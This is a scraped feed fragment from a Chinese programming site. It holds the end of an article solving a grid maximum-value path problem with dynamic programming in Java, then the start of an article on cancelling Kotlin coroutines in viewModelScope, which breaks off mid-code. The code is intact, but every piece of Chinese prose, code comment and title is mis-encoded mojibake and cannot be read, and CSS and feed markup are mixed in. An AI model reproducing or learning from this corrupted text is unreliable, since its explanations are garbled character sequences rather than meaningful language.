<p>çŠ¶æ€è½¬ç§»ï¼š<code>dp[i][j] = max(dp[i-1][j], dp[i][j-1]) + grid[i][j]</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    <span class="hljs-type">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[m][n];
    
    <span class="hljs-comment">// åˆå§‹åŒ–èµ·ç‚¹</span>
    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
    
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€è¡Œï¼šåªèƒ½ä»å·¦è¾¹æ¥</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        dp[<span class="hljs-number">0</span>][j] = dp[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>] + grid[<span class="hljs-number">0</span>][j];
    }
    
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€åˆ—ï¼šåªèƒ½ä»ä¸Šè¾¹æ¥</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        dp[i][<span class="hljs-number">0</span>] = dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + grid[i][<span class="hljs-number">0</span>];
    }
    
    <span class="hljs-comment">// å¡«å……å…¶ä½™ä½ç½®</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            dp[i][j] = Math.max(dp[i-<span class="hljs-number">1</span>][j], dp[i][j-<span class="hljs-number">1</span>]) + grid[i][j];
        }
    }
    
    <span class="hljs-keyword">return</span> dp[m-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>];
}
</code></pre>
<p>æ¯ä¸ªä½ç½®çš„è®¡ç®—åªä¾èµ–å·¦è¾¹å’Œä¸Šè¾¹çš„ç»“æœï¼Œé€šè¿‡åŒé‡å¾ªç¯è‡ªå·¦ä¸Šå‘å³ä¸‹å¡«å……æ•´ä¸ªdpè¡¨</p>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ï¼šO(mn)</li>
<li>ç©ºé—´å¤æ‚åº¦ï¼šO(mn)</li>
</ul>
<h3 data-id="heading-3">ç©ºé—´ä¼˜åŒ–åŠ¨æ€è§„åˆ’</h3>
<p>è§‚å¯Ÿå‘ç°å½“å‰è¡Œåªä¾èµ–ä¸Šä¸€è¡Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€ç»´æ•°ç»„è¿›è¡Œç©ºé—´ä¼˜åŒ–ï¼Œåˆ©ç”¨<code>dp[j]</code>åœ¨æ›´æ–°å‰å­˜å‚¨ä¸Šä¸€è¡Œç¬¬jåˆ—çš„å€¼ï¼Œæ›´æ–°åå­˜å‚¨å½“å‰è¡Œç¬¬jåˆ—çš„å€¼ï¼Œå®ç°ç©ºé—´å¤ç”¨</p>
<p><code>dp[j]</code>è¡¨ç¤ºå½“å‰è¡Œç¬¬jåˆ—çš„æœ€å¤§ä»·å€¼ï¼Œæ»šåŠ¨æ›´æ–°</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    <span class="hljs-type">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];
    
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€è¡Œ</span>
    dp[<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        dp[j] = dp[j-<span class="hljs-number">1</span>] + grid[<span class="hljs-number">0</span>][j];
    }
    
    <span class="hljs-comment">// å¤„ç†åç»­è¡Œ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-comment">// æ›´æ–°ç¬¬ä¸€åˆ—</span>
        dp[<span class="hljs-number">0</span>] += grid[i][<span class="hljs-number">0</span>];
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            <span class="hljs-comment">// dp[j]ä»£è¡¨ä¸Šä¸€è¡Œç¬¬jåˆ—çš„å€¼ï¼ˆä»ä¸Šæ–¹æ¥ï¼‰</span>
            <span class="hljs-comment">// dp[j-1]ä»£è¡¨å½“å‰è¡Œç¬¬j-1åˆ—çš„å€¼ï¼ˆä»å·¦è¾¹æ¥ï¼‰</span>
            dp[j] = Math.max(dp[j], dp[j-<span class="hljs-number">1</span>]) + grid[i][j];
        }
    }
    
    <span class="hljs-keyword">return</span> dp[n-<span class="hljs-number">1</span>];
}
</code></pre>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ï¼šO(mn)</li>
<li>ç©ºé—´å¤æ‚åº¦ï¼šO(n)</li>
</ul>
<h3 data-id="heading-4">åŸåœ°ä¿®æ”¹åŠ¨æ€è§„åˆ’ï¼ˆæœ€ä¼˜è§£ï¼‰</h3>
<p>ä¿®æ”¹åŸæ•°ç»„ï¼Œç›´æ¥ä½¿ç”¨gridæ•°ç»„ä½œä¸ºdpè¡¨ï¼Œé¿å…é¢å¤–ç©ºé—´åˆ†é…</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€è¡Œ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        grid[<span class="hljs-number">0</span>][j] += grid[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];
    }
    
    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€åˆ—</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        grid[i][<span class="hljs-number">0</span>] += grid[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];
    }
    
    <span class="hljs-comment">// å¡«å……å…¶ä½™ä½ç½®</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            grid[i][j] += Math.max(grid[i-<span class="hljs-number">1</span>][j], grid[i][j-<span class="hljs-number">1</span>]);
        }
    }
    
    <span class="hljs-keyword">return</span> grid[m-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>];
}
</code></pre>
<ul>
<li>æ—¶é—´å¤æ‚åº¦ï¼š O(nm) ï¼Œéœ€è¦è®¡ç®—å®Œâ¾¥â¾¯çš„â¼©æ ¼â¼¦</li>
<li>ç©ºé—´å¤æ‚åº¦ï¼š O(1) ï¼Œä¼˜åŒ–åå¯ä»¥å®ç°åŸåœ°æ“ä½œï¼Œä¸éœ€è¦é¢å¤–çš„ç©ºé—´</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹]]></title>    <link>https://juejin.cn/post/7602488187407614004</link>    <guid>https://juejin.cn/post/7602488187407614004</guid>    <pubDate>2026-02-04T00:29:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488187407614004" data-draft-id="7600225000851111971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-02-04T00:29:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:29:49.000Z" title="Wed Feb 04 2026 00:29:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c242af436549feb356a83a5d210f54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=B%2B3HYeFBUGjLyg%2F2%2FyV7t5iLOLU%3D" alt="0.png" loading="lazy"/></p>
<p>æ˜¨å¤©ï¼Œæˆ‘å†™è¿‡è¿™æ ·<a href="https://juejin.cn/post/7602072652607602728" target="_blank" title="https://juejin.cn/post/7602072652607602728">ä¸€ç¯‡æ–‡ç« </a>ï¼Œé‡Œé¢è®²è¿°äº†ä¸€ä¸ªå¯èƒ½ 90% çš„å¼€å‘è€…éƒ½ç­”ä¸ä¸Šæ¥é—®é¢˜ã€‚</p>
<p>ä¸­åˆæˆ‘å’ŒåŒäº‹åƒé¥­çš„æ—¶å€™ï¼Œä»–é—®æˆ‘ï¼šç„¶åå‘¢ï¼Œä½ å°±æ°´ä¸€ç¯‡æ–‡ç« ä¸ç»™è§£å†³æ–¹æ¡ˆï¼Ÿä½ çŸ¥é“ç¨‹åºå‘˜æµè¡Œä¸€å¥ä»€ä¹ˆæ ·çš„è¯å—ï¼Ÿâ€”â€”ç•™å›¾ä¸ç•™ç§ï¼Œxxä¸‡äººxã€‚</p>
<p>OKï¼Œæ‰“ä½ï¼</p>
<p>è¿™é‡Œï¼Œæˆ‘ä»¬ä» <code>viewModelScope</code> å…¥æ‰‹ï¼Œçœ‹çœ‹è¿™ä¸ªå–æ¶ˆçš„é—®é¢˜ï¼</p>
<h2 data-id="heading-0">viewModelScope</h2>
<p>æˆ‘çŸ¥é“ï¼Œä½œä¸ºä¸€åå®‰å“å¼€å‘è€…ï¼Œéƒ½æ›¾èŠ±è´¹æ— æ•°æ—¶é—´è°ƒè¯•å„ç§è¯¡å¼‚çš„å´©æºƒé—®é¢˜å’Œå†…å­˜æ³„æ¼ï¼Œè€Œè¿™äº›é—®é¢˜çš„æ ¹æºå¾€å¾€éƒ½æŒ‡å‘åç¨‹å¤„ç†ä¸å½“ã€‚</p>
<p>å¦‚æœä½¿ç”¨ <code>Kotlin</code> åç¨‹ï¼Œå¤§æ¦‚ç‡å¯¹ <code>viewModelScope</code> å¹¶ä¸é™Œç”Ÿã€‚</p>
<p>å®ƒæ˜¯å°†åç¨‹ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸç»‘å®šçš„ç»ä½³å·¥å…·ï¼Œä½†å¦‚æœå–æ¶ˆæ“ä½œå¤„ç†ä¸å½“ï¼Œéº»çƒ¦ä¾¿ä¼šæ¥è¸µè€Œè‡³ã€‚</p>
<p>æ³„æ¼çš„åç¨‹ä¼šæŒç»­å ç”¨èµ„æºã€æµªè´¹ <code>CPU</code> ç®—åŠ›ï¼Œæ›´ç³Ÿçš„æ˜¯ï¼Œè¿˜å¯èƒ½å¯¼è‡´åº”ç”¨è¡Œä¸ºå¼‚å¸¸ã€‚</p>
<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†åˆ†äº«è‡ªå·±æ‘¸ç´¢å‡ºçš„ <code>viewModelScope</code> å–æ¶ˆæ“ä½œå®æˆ˜ç»éªŒï¼Œç»“åˆå…·ä½“ç¤ºä¾‹å’ŒæŠ€å·§ï¼Œé¿å…è¢«â€œxxä¸‡äººxâ€ã€‚</p>
<h2 data-id="heading-1">ä¸ºä½•å–æ¶ˆæ“ä½œè‡³å…³é‡è¦</h2>
<p><code>viewModelScope</code> æ˜¯ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸç»‘å®šçš„åç¨‹ä½œç”¨åŸŸã€‚</p>
<p>å½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼ˆæ¯”å¦‚å…³è”çš„ <code>Activity</code> æˆ– <code>Fragment</code> é”€æ¯ï¼‰ï¼Œè¯¥ä½œç”¨åŸŸä¼šè‡ªåŠ¨å–æ¶ˆæ‰€æœ‰å…³è”çš„åç¨‹ã€‚</p>
<p>å¬èµ·æ¥å¾ˆå®Œç¾ï¼Ÿ</p>
<p>ä½†å…³é”®é—®é¢˜åœ¨äºï¼šè‡ªåŠ¨å–æ¶ˆä¸ä»£è¡¨å¯ä»¥é«˜æ•æ— å¿§ã€‚ç¨ä¸æ³¨æ„ï¼Œåç¨‹ä»å¯èƒ½è¶…æ—¶è¿è¡Œã€å ç”¨èµ„æºï¼Œæˆ–è§¦å‘æœªæ•è·å¼‚å¸¸å¯¼è‡´åº”ç”¨å´©æºƒã€‚</p>
<p><em>è¿˜è®°å¾—ä¹‹å‰çš„æ–‡ç« çš„é‚£å¥è¯å—ï¼Ÿåç¨‹çš„å–æ¶ˆæ˜¯åä½œçš„ã€‚</em></p>
<p>è§„èŒƒçš„å–æ¶ˆæ“ä½œèƒ½ç¡®ä¿åº”ç”¨å§‹ç»ˆè½»é‡ã€è¡Œä¸ºå¯é¢„æµ‹ï¼Œå°¤å…¶æ˜¯åœ¨é…ç½®å˜æ›´æˆ–è¿›ç¨‹ç»ˆæ­¢çš„åœºæ™¯ä¸‹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬èŠèŠå¦‚ä½•ä¸“ä¸šåœ°ç®¡ç† <code>viewModelScope</code> çš„å–æ¶ˆé€»è¾‘ã€‚</p>
<h2 data-id="heading-2">ç†è§£ viewModelScope</h2>
<p><code>viewModelScope</code> æ˜¯ <code>androidx.lifecycle:lifecycle-viewmodel-ktx</code> åº“æä¾›çš„å±æ€§ï¼Œæœ¬è´¨æ˜¯ç»‘å®šåˆ° <code>Dispatchers.Main</code> ä¸»çº¿ç¨‹ã€ä¸”ä¸ <code>ViewModel</code> ç”Ÿå‘½å‘¨æœŸå…³è”çš„ <code>CoroutineScope</code>ã€‚</p>
<p>å½“ <code>ViewModel</code> çš„ <code>onCleared()</code> æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¯¥ä½œç”¨åŸŸä¼šå–æ¶ˆæ‰€æœ‰åç¨‹ã€‚</p>
<p>è¿™å¯¹ <code>Android</code> å¼€å‘è€Œè¨€å ªç§°ç»é…â€”â€”æ¯•ç«Ÿ <code>UI</code> ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸæœ¬å°±å¤šå˜ï¼Œä½†è¿™ä¸€åˆ‡çš„å‰ææ˜¯ï¼Œä½ ç¼–å†™çš„ä»£ç è¦å…·å¤‡â€œå–æ¶ˆæ„ŸçŸ¥â€èƒ½åŠ›ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>viewModelScope</code> çš„ç®€å• <code>ViewModel</code> ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchDataFromNetwork() <span class="hljs-comment">// æŒ‚èµ·å‡½æ•°</span>
            <span class="hljs-comment">// æ›´æ–°UI</span>
        }
    }
}
</code></pre>
<p>å½“ <code>ViewModel</code> è¢«é”€æ¯ï¼ˆæ¯”å¦‚ç”¨æˆ·è·³è½¬é¡µé¢ï¼‰ï¼Œåç¨‹ä¼šè¢«å–æ¶ˆã€‚</p>
<p>ä½†å¦‚æœ <code>fetchDataFromNetwork()</code> æ˜¯è€—æ—¶æ“ä½œï¼Œæƒ…å†µä¼šå¦‚ä½•ï¼Ÿ</p>
<h2 data-id="heading-3">å–æ¶ˆæ“ä½œä¸å½“çš„å¸¸è§é™·é˜±</h2>
<p>åœ¨æˆ‘æ—©æœŸçš„é¡¹ç›®ä¸­ï¼Œæˆ‘æ›¾ä»¥ä¸º <code>viewModelScope</code> èƒ½â€œé­”æ³•èˆ¬â€å¤„ç†æ‰€æœ‰é—®é¢˜ï¼Œå®é™…ä¸Šæ ¹æœ¬ä¸å¯èƒ½ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘è¸©è¿‡çš„å…¸å‹å‘ï¼š</p>
<ol>
<li><strong>ä¸å¯å–æ¶ˆçš„æ“ä½œ</strong>ï¼šéƒ¨åˆ†æŒ‚èµ·å‡½æ•°ï¼ˆå¦‚ç¬¬ä¸‰æ–¹åº“è°ƒç”¨ï¼‰ä¸å“åº”å–æ¶ˆæŒ‡ä»¤ï¼Œå¯¼è‡´èµ„æºæŒç»­å ç”¨ã€‚æˆ–è€…ï¼Œä½ è°ƒç”¨çš„å‡½æ•°å°±æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œæ ¹æœ¬ä¸æ˜¯æŒ‚èµ·å‡½æ•°ï¼Œä¸å¯èƒ½å“åº”å–æ¶ˆæŒ‡ä»¤ï¼›</li>
<li><strong>èµ„æºæ³„æ¼</strong>ï¼šè‹¥åç¨‹æŒæœ‰ <code>Context</code> æˆ– <code>View</code> çš„å¼•ç”¨ï¼Œå³ä¾¿å–æ¶ˆåç¨‹ä¹Ÿæ— æ³•é‡Šæ”¾èµ„æºï¼Œæœ€ç»ˆå¼•å‘å†…å­˜æ³„æ¼ï¼›</li>
<li><strong>æœªæ•è·å¼‚å¸¸</strong>ï¼šåç¨‹å–æ¶ˆè¿‡ç¨‹ä¸­è‹¥æŠ›å‡ºæœªå¤„ç†çš„ <code>CancellationException</code>ï¼Œå¯èƒ½ç›´æ¥å¯¼è‡´åº”ç”¨å´©æºƒã€‚</li>
</ol>
<h2 data-id="heading-4">é¢˜å¤–è¯</h2>
<p>å…¶å®æ—©æœŸå¯¹äºçº¿ç¨‹æˆ‘ä¹Ÿæ˜¯è¿™ä¹ˆç†è§£çš„ï¼Œæˆ‘ä»¬ç¿»çœ‹ä¸€ä¸‹ç°åœ¨çš„ Java çº¿ç¨‹çš„æºç ï¼š</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Deprecated(
    since = "1.2",
    forRemoval = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
